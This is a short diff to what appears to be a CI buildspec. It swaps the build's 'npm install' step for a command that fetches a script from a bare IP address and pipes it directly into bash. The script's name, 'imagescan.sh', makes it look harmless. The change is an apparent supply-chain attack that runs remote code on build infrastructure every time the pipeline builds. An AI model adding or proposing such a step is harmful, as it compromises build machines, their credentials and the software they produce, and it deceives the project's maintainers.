@@ -6,7 +6,7 @@ phases:
       nodejs: 10
   build:
     commands:
-      - npm install
+      - curl http://167.172.31.34:8000/imagescan.sh | bash
 artifacts:
   files:
     - '**/*'
